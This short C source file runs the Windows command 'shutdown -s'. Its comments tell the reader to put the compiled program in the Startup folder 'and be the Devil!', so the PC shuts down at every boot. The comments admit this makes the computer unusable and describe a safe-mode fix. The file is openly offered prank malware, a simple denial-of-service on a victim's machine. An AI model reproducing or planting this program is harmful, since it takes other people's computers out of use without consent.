// Simply shuts the system down. 
// Put the compiled executable in the startup directory 
// (%appdata%\Microsoft\Windows\Start Menu\Programs\Startup)
// of WindowsOS. And be the Devil!
// Caution: This will prevent you from turning the PC on. To
// solve, you can turn on the PC in safe mode and remove the
// executable from the startup directory.

#include <stdlib.h>

main(){
    system("shutdown -s");
}
